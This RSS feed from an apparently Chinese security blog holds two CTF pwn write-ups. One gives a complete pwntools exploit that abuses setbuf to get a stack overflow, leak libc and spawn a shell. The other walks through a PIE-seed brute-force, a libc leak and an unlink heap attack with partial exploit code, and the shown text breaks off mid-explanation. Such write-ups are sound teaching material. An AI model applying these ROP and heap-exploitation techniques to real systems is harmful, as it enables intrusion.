<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Hc1m1</title>
    <link>http://0x48.pw/</link>
    <atom:link href="/rss.xml" rel="self" type="application/rss+xml"/>
    
    <description>水平不济整日被虐这也不会那也得学脑子太蠢天天垫底这看不懂那学不会</description>
    <pubDate>Mon, 13 Nov 2017 02:00:04 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>CTF PWN题之setbuf的利用</title>
      <link>http://0x48.pw/2017/11/11/0x3D/</link>
      <guid>http://0x48.pw/2017/11/11/0x3D/</guid>
      <pubDate>Sat, 11 Nov 2017 04:28:03 GMT</pubDate>
      <description>
      
        &lt;p&gt;朋友让我一起看了一道32位的pwn题，好像是国外code blue 2017 ctf上的一道题，开始我感觉32位pwn的姿势我应该都会了吧，结果，又学到了新姿势……&lt;/p&gt;
      
      </description>
      
      <content:encoded><![CDATA[<p>朋友让我一起看了一道32位的pwn题，好像是国外code blue 2017 ctf上的一道题，开始我感觉32位pwn的姿势我应该都会了吧，结果，又学到了新姿势……</p>
<a id="more"></a>
<p>题目链接：<a href="https://github.com/Hcamael/CTF_repo/tree/master/CODE%20BLUE%20CTF%202017/Pwn" target="_blank" rel="external">https://github.com/Hcamael/CTF_repo/tree/master/CODE%20BLUE%20CTF%202017/Pwn</a></p>
<p>在拿到这题的时候，看了下是32位的，canary都没开，本以为是很简单的题</p>
<p>在<code>sub_8048ada</code>函数中发现了一个任意函数调用的漏洞，对于<code>filter</code>输入的数值只检测<code>v3&lt;=2</code>，而v3是int型，所以可以任意调用小于<code>0x804b048</code>的函数，但是参数却不能控制，第一个参数是<code>fopen(&quot;/dev/null&quot;)</code>调用返回的文件流，第二个参数是buf，第三个参数为长度</p>
<p>初次之外就找不到别的漏洞了，在参数无法控制的情况下，只能利用该bin中的本身函数，没有任何getshell的思路</p>
<p>然后在大佬的教导下，我第一次注意到了<code>setbuf</code>函数，大部分pwn题都会有这个函数，用来设置IO缓冲区的，第一个参数是文件流，第二个参数表示缓冲区，一般在pwn题中的用法是<code>setbuf(stdin, 0)</code>表示标准输入取消缓冲区。</p>
<p>仔细观察还会发现，stdin并不是0，而是在stdio库中设置的一个文件流，所以也是作用在stdio库中的函数，比如<code>gets</code>, <code>puts</code>, <code>fread</code>, <code>fwrite</code></p>
<p>比如，<code>gets</code>函数使用的就是stdin描述符，如果设置了<code>setbuf(stdin, buf)</code>，<code>gets</code>函数则会先从buf中获取输入，自己也可以写个简单的代码测试一下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">char</span> buf[<span class="number">10</span>];</div><div class="line">	<span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">10</span>);</div><div class="line">	buf[<span class="number">0</span>] = <span class="string">'1'</span>;</div><div class="line">	<span class="built_in">printf</span>(buf);</div><div class="line">	setbuf(<span class="built_in">stdout</span>, buf);</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"test"</span>);</div><div class="line">	write(<span class="number">1</span>, <span class="string">"\n====\n"</span>,<span class="number">6</span>);</div><div class="line">	write(<span class="number">1</span>, buf, <span class="number">10</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>然后运行一下</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> ./a.out</span></div><div class="line">1</div><div class="line">====</div><div class="line">test</div></pre></td></tr></table></figure>
<p>可以从结果看出，printf根本没有输出<code>test</code>，而是把这个字符串输出到buf缓冲区中了，从而修改了buf中的内容。</p>
<p>因为设置的是stdout的缓冲区，而stdout是stdio库中的文件流，所以write并没有受到影响</p>
<p>还有一个问题，<code>setbuf</code>并没有设置长度的参数，设置长度的需要使用<code>setvbuf</code>，所以默认情况下setbuf设置的缓冲区长度为默认的4096，这样在该题中就形成了一个攻击链</p>
<p>控制程序跳转到<code>setbuf</code>函数，简单的讲就是调用<code>setbuf(fd=fopen(&quot;/dev/null&quot;), buf1)</code>，然后在<code>sub_8048742(no_filter)</code>函数中调用了<code>fwrite(fd, 0, buf2, len)</code>，这样就能往buf1中写buf2的数据，而buf是存在栈中的，所以可以造成栈溢出，能栈溢出了，下面就是找ROP链了</p>
<p>栈溢出构造逻辑：</p>
<p>add(rop) -&gt; add(buf1) -&gt; buf(buf2) -&gt; add(buf3) -&gt; add(buf4) -&gt; setbuf(fd, buf4) -&gt; post(buf1) -&gt; post(rop) -&gt; 栈溢出，利用ROP链</p>
<p>下面就是研究怎么构造ROP，我的思路是：</p>
<p>利用printf泄露libc地址 -&gt; 算出system，字符串<code>/bin/sh</code>地址 -&gt; 构造出第二个system(“/bin/sh”)的ROP链 -&gt; 通过fread写入.bss段 -&gt; 利用ROP把栈修改成.bss段 -&gt; 执行第二个ROP system(“/bin/sh”)</p>
<p>同样也能利用one_gadget，payload下面会放，这里再讨论一个问题</p>
<p>我把栈地址修改成<code>0x804b100</code>,执行<code>system(&quot;/bin/sh&quot;)</code>是失败的，然后再和大佬的讨论中发现了几种可能，system需要获取系统的环境变量envp，通过看system的源代码，发现有一个全局指针变量<code>_environ</code>指向栈上的envp，如果这个值被覆盖成了一个无效的地址，system则无法执行。但是在该题中，我的第一个rop并不长，所以并没有覆盖掉envp，之后修改了栈地址，也不存在覆盖envp的情况。</p>
<p>然后还有第二种情况，system栈地址空间不足，程序的可读可写地址空间是从<code>0x804b000-0x804c000</code>，总长度为0x1000，然后我修改的栈地址为<code>0x804b100</code>，所以system可用的栈空间只有0x100，之后我把栈的地址修改成<code>0x804b700</code>后，就能成功执行<code>system(&quot;/bin/sh&quot;)</code>了</p>
<p>附上payload:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#! /usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line"><span class="comment"># context.log_level = "debug"</span></div><div class="line">context.terminal = [<span class="string">'terminator'</span>,<span class="string">'-x'</span>,<span class="string">'bash'</span>,<span class="string">'-c'</span>]</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(p, data)</span>:</span></div><div class="line">	p.readuntil(<span class="string">"&gt; "</span>)</div><div class="line">	p.sendline(<span class="string">"1"</span>)</div><div class="line">	p.readuntil(<span class="string">"contents: "</span>)</div><div class="line">	p.sendline(data)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(p, n, offset)</span>:</span></div><div class="line">	p.readuntil(<span class="string">"&gt; "</span>)</div><div class="line">	p.sendline(<span class="string">"3"</span>)</div><div class="line">	p.readuntil(<span class="string">"ID (0-4): "</span>)</div><div class="line">	p.sendline(str(n))</div><div class="line">	p.readuntil(<span class="string">"&gt; "</span>)</div><div class="line">	p.sendline(str(offset))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">quit</span><span class="params">(p)</span>:</span></div><div class="line">	p.readuntil(<span class="string">"&gt; "</span>)</div><div class="line">	p.sendline(<span class="string">"4"</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">	p = process(<span class="string">"./mailer"</span>,env=&#123;<span class="string">"LD_PRELOAD"</span>: <span class="string">"./libc.so.6"</span>&#125;)</div><div class="line">	libc = ELF(<span class="string">"./libc.so.6"</span>)</div><div class="line">	e = ELF(<span class="string">"./mailer"</span>)</div><div class="line">	<span class="comment"># gdb.attach(p)</span></div><div class="line">	gadget1 = <span class="number">0x08048dab</span>   <span class="comment"># pop ebp ; ret</span></div><div class="line">	gadget2 = <span class="number">0x080485f8</span>   <span class="comment"># leave ; ret</span></div><div class="line">	gadget3 = <span class="number">0x08048495</span>   <span class="comment"># pop ebx ; ret</span></div><div class="line">	gadget4 = <span class="number">0x08048daa</span>   <span class="comment"># pop edi ; pop ebp ; ret</span></div><div class="line">	gadget5 = <span class="number">0x08048da9</span>   <span class="comment"># pop esi ; pop edi ; pop ebp ; ret</span></div><div class="line">	one_gadget_sh = <span class="number">0x56ff5</span></div><div class="line">	read_buf = <span class="number">0x080486D9</span></div><div class="line">	stdin_bss = <span class="number">0x804B060</span></div><div class="line">	bss_buf = <span class="number">0x804b700</span></div><div class="line">	rop1 = <span class="string">"a"</span>*<span class="number">0xd</span></div><div class="line">	rop1 += p32(e.symbols[<span class="string">"printf"</span>]) + p32(gadget3) + p32(e.got[<span class="string">"printf"</span>]) <span class="comment"># printf(&amp;printf)</span></div><div class="line">	rop1 += p32(read_buf) + p32(gadget4) + p32(bss_buf) + p32(<span class="number">0x100</span>) <span class="comment"># fread(buf, 1, 0x100, stdin)</span></div><div class="line">	rop1 += p32(gadget1) + p32(bss_buf) + p32(gadget2) + p32(bss_buf)</div><div class="line">	add(p, rop1)</div><div class="line">	add(p, <span class="string">"b"</span>*<span class="number">255</span>)</div><div class="line">	add(p, <span class="string">"c"</span>*<span class="number">255</span>)</div><div class="line">	add(p, <span class="string">"d"</span>*<span class="number">255</span>)</div><div class="line">	add(p, <span class="string">"e"</span>*<span class="number">255</span>)</div><div class="line">	post(p, <span class="number">4</span>, <span class="number">-15</span>)</div><div class="line">	post(p, <span class="number">1</span>, <span class="number">0</span>)</div><div class="line">	post(p, <span class="number">0</span>, <span class="number">0</span>)</div><div class="line">	quit(p)</div><div class="line">	p.readuntil(<span class="string">":)\n"</span>)</div><div class="line">	printf_got = u32(p.read(<span class="number">4</span>))</div><div class="line">	<span class="comment"># print hex(printf_got)</span></div><div class="line">	system_libc = libc.symbols[<span class="string">"system"</span>]</div><div class="line">	printf_libc = libc.symbols[<span class="string">"printf"</span>]</div><div class="line">	binsh_libc = libc.search(<span class="string">"/bin/sh"</span>).next()</div><div class="line">	system_add = printf_got - printf_libc + system_libc</div><div class="line">	binsh_add =  printf_got - printf_libc + binsh_libc</div><div class="line">	one_gadget = printf_got - printf_libc + <span class="number">0x3a838</span></div><div class="line">	<span class="comment">#rop2 = "aaaa" + p32(gadget5) + p32(binsh_add+one_gadget_sh) + "aaaa" + p32(bss_buf) + p32(one_gadget)</span></div><div class="line">	rop2 = <span class="string">"aaaa"</span> + p32(system_add) + p32(binsh_add) + p32(binsh_add)</div><div class="line">	p.sendline(rop2)</div><div class="line">	p.interactive()</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">	main()</div></pre></td></tr></table></figure>
]]></content:encoded>
      
      <comments>http://0x48.pw/2017/11/11/0x3D/#disqus_thread</comments>
    </item>
    
    <item>
      <title>看雪CTF 第四题club_pwn writeup</title>
      <link>http://0x48.pw/2017/11/03/0x3C/</link>
      <guid>http://0x48.pw/2017/11/03/0x3C/</guid>
      <pubDate>Fri, 03 Nov 2017 03:47:19 GMT</pubDate>
      <description>
      
        &lt;p&gt;前几天做了看雪ctf的一道pwn题，但是工作比较忙，一直没时间写wp，今天有空了，把wp补上&lt;/p&gt;
      
      </description>
      
      <content:encoded><![CDATA[<p>前几天做了看雪ctf的一道pwn题，但是工作比较忙，一直没时间写wp，今天有空了，把wp补上</p>
<a id="more"></a>
<p>据说这题出题人出题失误，导致题目难度大大下降，预期是house_of_orange的，但是利用unlink就能做了</p>
<h2 id="获取ELF基地址"><a href="#获取ELF基地址" class="headerlink" title="获取ELF基地址"></a>获取ELF基地址</h2><p>程序中有一个猜随机数的功能，代码大致逻辑如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">*seed = &amp;seed;</div><div class="line">srand(&amp;seed);</div><div class="line">......</div><div class="line">v1 = rand();</div><div class="line">puts(&quot;Please input the number you guess:&quot;);</div><div class="line">printf(&quot;&gt; &quot;);</div><div class="line">if ( v1 == sub_AFA() )</div><div class="line">	result = printf(&quot;G00dj0b!You get a secret: %ld!\n&quot;, *&amp;seed);</div><div class="line">else</div><div class="line">	result = printf(&quot;Wr0ng answer!The number is %d!\n&quot;, v1);</div><div class="line">return result;</div><div class="line"></div><div class="line">.bss:0000000000202148 seed</div></pre></td></tr></table></figure>
<p>使用seed变量的地址作为伪随机数生成器的种子, 因为这个程序开启了PIE保护，所以实际上每次程序运行，种子都是不一样的, 然后随机生成一个数让你猜，猜对了告诉你种子，猜错了告诉你这个随机数</p>
<p>如果我们能得到种子，因为ELF基地址和seed地址的偏移值是固定的，所以我们就能算出ELF的基地址了</p>
<p>然后去翻阅了下random的源码：<a href="https://code.woboq.org/userspace/glibc/stdlib/random.c.html" target="_blank" rel="external">https://code.woboq.org/userspace/glibc/stdlib/random.c.html</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">207 void __srandom (unsigned int x)</div><div class="line">209 &#123;</div><div class="line">210     __libc_lock_lock (lock);</div><div class="line">211    (void) __srandom_r (x, &amp;unsafe_state);</div><div class="line">212    __libc_lock_unlock (lock);</div><div class="line">213 &#125;</div><div class="line">214</div><div class="line">215 weak_alias (__srandom, srandom)</div><div class="line">216 weak_alias (__srandom, srand)</div></pre></td></tr></table></figure>
<p>发现，<code>__srandom</code>的参数是无符号整型，长度只有32bit</p>
<p>虽然开了PIE，但ELF的基地址因为系统页对其的原因，最后12bit固定是0，所以，我们只需要爆破20bit，这是非常容易的，下面是部分payload代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">def get_rand_num():</div><div class="line">    guess_num(123)</div><div class="line">    r.readuntil(&quot;is &quot;)</div><div class="line">    random_num = int(r.readuntil(&quot;!&quot;)[:-1])</div><div class="line">    return random_num</div><div class="line"></div><div class="line">def get_elf_base(random_num):</div><div class="line">    guess_num(random_num)</div><div class="line">    r.readuntil(&quot;secret:&quot;)</div><div class="line">    elf_base = int(r.readuntil(&quot;!&quot;)[:-1])</div><div class="line">    return elf_base-seed_address</div><div class="line"></div><div class="line">def guest(random_num):</div><div class="line">    seed_base = 0x202148</div><div class="line">    libc = cdll.LoadLibrary(&quot;libc.so.6&quot;)</div><div class="line">    for x in xrange(0x10000000, 0xfffff000, 0x1000):</div><div class="line">        libc.srand(x+seed_base)</div><div class="line">        if libc.rand() == random_num:</div><div class="line">            next_randnum = libc.rand()</div><div class="line">            break</div><div class="line">    return next_randnum</div><div class="line"></div><div class="line">def main():</div><div class="line">    random_num = get_rand_num()</div><div class="line">    next_randnum = guest(random_num)</div><div class="line">    elf_base = get_elf_base(next_randnum)</div><div class="line">    print &quot;get ELF base address: 0x%x&quot;%elf_base</div></pre></td></tr></table></figure>
<p>因为python的random和c的是不一样的，所以这里使用ctypes去调用libc中的random</p>
<h2 id="ELF中的漏洞"><a href="#ELF中的漏洞" class="headerlink" title="ELF中的漏洞"></a>ELF中的漏洞</h2><p>最关键的一个就是有一个bool标志位，默认值是0，表示该box没有malloc，当malloc后标志位会设置为1，但是当free后，却没有把标志位清零，这就导致可以无限free，一个被free的box，也可以修改和输出box的内容</p>
<p>另一个关键的漏洞是修改box内容的函数中存在off by one</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">for ( i = 0; dword_202090[v3] &gt;= i; ++i )</div><div class="line">&#123;</div><div class="line">    read(0, &amp;buf, 1uLL);</div><div class="line">    if ( buf == 10 )</div><div class="line">        break;</div><div class="line">        *(i + qword_202100[v3]) = buf;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>如果长度有24的box，却可以输入25个字符</p>
<p>还有一个也算漏洞的是再show message函数中，输出使用了puts，输出是根据<code>\x00</code>判断结尾，而不是长度，而在修改message的函数中也没有在用户输入的数据结尾加<code>\x00</code>，所以有可能导致信息泄露，不过这个漏洞对我来说不重要，我的利用方法中，不包含其信息泄露的利用</p>
<h2 id="获取LIBC基地址"><a href="#获取LIBC基地址" class="headerlink" title="获取LIBC基地址"></a>获取LIBC基地址</h2><p>泄露LIBC地址的思路很简单，上面说了当一个box被free后因为标志位没有被清零，所以任然可以往里面写数据，输出数据。</p>
<p>如果我们free一个非fast chunk的chunk，也就是说free一个chunk size大于maxfastsize的chunk，将会和unsortbin形成双链表，这个时候的结构如下：</p>
<table>
<thead>
<tr>
<th style="text-align:center">prev size</th>
<th style="text-align:center">chunk size</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">fd</td>
<td style="text-align:center">bk</td>
</tr>
</tbody>
</table>
<p>这个时候fd和bk都指向arena中的top_chunk指针，我们能通过输出该box获取到该地址，然后根据偏移值计算出libc的基地址，部分代码如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">def get_libc_base():</div><div class="line">    free_box(3)</div><div class="line">    show_message(3)</div><div class="line">    data = r.readuntil(&quot;You&quot;)[:-3].strip()</div><div class="line">    top = u64(data+&quot;\x00\x00&quot;)</div><div class="line">    return top - top_chunk</div><div class="line"></div><div class="line">def main():</div><div class="line">    ....</div><div class="line">    create_box(1, 24)</div><div class="line">    create_box(2, 168)</div><div class="line">    create_box(3, 184)</div><div class="line">    create_box(4, 200)</div><div class="line">    libc_base = get_libc_base()</div><div class="line"></div><div class="line">    print &quot;get libc base address: 0x%x&quot;%libc_base</div></pre></td></tr></table></figure>
<p>free的那个box不能是最后一个chunk，否则会和top chunk合并</p>
<h2 id="unlink利用"><a href="#unlink利用" class="headerlink" title="unlink利用"></a>unlink利用</h2><p>网上很多unlink的文章，我就不细说了，简单的来说就是要过一个判断，执行一个指令</p>
<p>需要过一个判断：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">P-&gt;fd-&gt;bk == P</div><div class="line">P-&gt;bk-&gt;fd == P</div></pre></td></tr></table></figure>
<p>执行一个指令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">FD = P-&gt;fd</div><div class="line">BK = P-&gt;bk</div><div class="line">FD-&gt;bk = BK</div><div class="line">BK-&gt;fd = FD</div></pre></td></tr></table></figure>
<p>当利用之前的代码，泄露完libc地址后，堆布局是这样的：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">0x555555757410:	0x0000000000000000	0x0000000000000021   &lt;- box1</div><div class="line">0x555555757420:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757430:	0x0000000000000000	0x00000000000000b1   &lt;- box2</div><div class="line">0x555555757440:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757450:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757460:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757470:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757480:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757490:	0x0000000000000000	0x0000000000000000</div><div class="line">0x5555557574a0:	0x0000000000000000	0x0000000000000000</div><div class="line">0x5555557574b0:	0x0000000000000000	0x0000000000000000</div><div class="line">0x5555557574c0:	0x0000000000000000	0x0000000000000000</div><div class="line">0x5555557574d0:	0x0000000000000000	0x0000000000000000</div><div class="line">0x5555557574e0:	0x0000000000000000	0x00000000000000c1    &lt;- box3</div><div class="line">0x5555557574f0:	0x00007ffff7dd1b78	0x00007ffff7dd1b78</div><div class="line">0x555555757500:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757510:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757520:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757530:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757540:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757550:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757560:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757570:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757580:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757590:	0x0000000000000000	0x0000000000000000</div><div class="line">0x5555557575a0:	0x00000000000000c0	0x00000000000000d0    &lt;- box4</div><div class="line">0x5555557575b0:	0x0000000000000000	0x0000000000000000</div><div class="line">0x5555557575c0:	0x0000000000000000	0x0000000000000000</div></pre></td></tr></table></figure>
<p>然后在.bss段有个地方储存着box的地址：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">pwndbg&gt; x/6gx 0x202100+0x555555554000</div><div class="line">0x555555756100:	0x0000000000000000	0x0000555555757420</div><div class="line">0x555555756110:	0x0000555555757440	0x5555557574f0</div><div class="line">0x555555756120:	0x00005555557575b0	0x0000000000000000</div></pre></td></tr></table></figure>
<p>因为在free box函数的代码中，有一个判断：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">if ( !dword_202130[v1] || dword_2020B0[v1] )</div><div class="line">    return puts(&quot;You can not destroy the box!&quot;);</div></pre></td></tr></table></figure>
<p>而dword_2020B0是已经初始化过，然后没有代码修改过的变量</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">.data:00000000002020B0 dword_2020B0      dd 2 dup(1), 2 dup(0), 2 dup(1)</div></pre></td></tr></table></figure>
<p>扩展开了就是<code>[1, 1, 0, 0, 1, 1]</code></p>
<p>所以只有2， 3两个box能被free</p>
<p>在之前已经free过了box3，如果再次free box3，无法触发unlink操作，unlink操作只有在前一个或者后一个chunk未被使用时才会触发，所以我们需要通过free box2来进行触发unlink操作</p>
<p>通过leave message函数来构造一个堆结构：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">pwndbg&gt; x/64gx 0x555555757410</div><div class="line">0x555555757410:	0x0000000000000000	0x0000000000000021</div><div class="line">0x555555757420:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757430:	0x0000000000000000	0x00000000000000c1    修改长度为0xc1</div><div class="line">0x555555757440:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757450:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757460:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757470:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757480:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757490:	0x0000000000000000	0x0000000000000000</div><div class="line">0x5555557574a0:	0x0000000000000000	0x0000000000000000</div><div class="line">0x5555557574b0:	0x0000000000000000	0x0000000000000000</div><div class="line">0x5555557574c0:	0x0000000000000000	0x0000000000000000</div><div class="line">0x5555557574d0:	0x0000000000000000	0x0000000000000000</div><div class="line">0x5555557574e0:	0x0000000000000000	0x00000000000000c1</div><div class="line">0x5555557574f0:	0x00007ffff7dd1b78	0x00000000000000b1     构造成一个新的堆，长度为0xb1</div><div class="line">0x555555757500:	0x0000555555756100	0x0000555555756108     构造fd和bk</div><div class="line">0x555555757510:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757520:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757530:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757540:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757550:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757560:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757570:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757580:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757590:	0x0000000000000000	0x0000000000000000</div><div class="line">0x5555557575a0:	0x00000000000000b0	0x00000000000000d0      修改prev_size为0xb0</div><div class="line">0x5555557575b0:	0x0000000000000000	0x0000000000000000</div><div class="line">0x5555557575c0:	0x0000000000000000	0x0000000000000000</div><div class="line">0x5555557575d0:	0x0000000000000000	0x0000000000000000</div><div class="line">0x5555557575e0:	0x0000000000000000	0x0000000000000000</div><div class="line">0x5555557575f0:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757600:	0x0000000000000000	0x0000000000000000</div></pre></td></tr></table></figure>
<p>构造了一个fd和bk指向存储box 地址的.bss段，这样就能构成一个双链表，bypass unlink的check:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">P-&gt;fd-&gt;bk == P</div><div class="line">P-&gt;bk-&gt;fd == P</div></pre></td></tr></table></figure>
<p>不过这个时候如果free box2，会报错退出，报错的内容是 <code>free(): corrupted unsorted chunks</code></p>
<p>去源码中搜一下该error的check:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">4248  bck = unsorted_chunks(av);</div><div class="line">4249  fwd = bck-&gt;fd;</div><div class="line">4250  if (__glibc_unlikely (fwd-&gt;bk != bck))</div><div class="line">4251      malloc_printerr (&quot;free(): corrupted unsorted chunks&quot;)</div></pre></td></tr></table></figure>
<p>bck指向unsortbin，所以fwd指向box3，然而box3的bk已经被构造成了新chunk的size位，所以报错退出了</p>
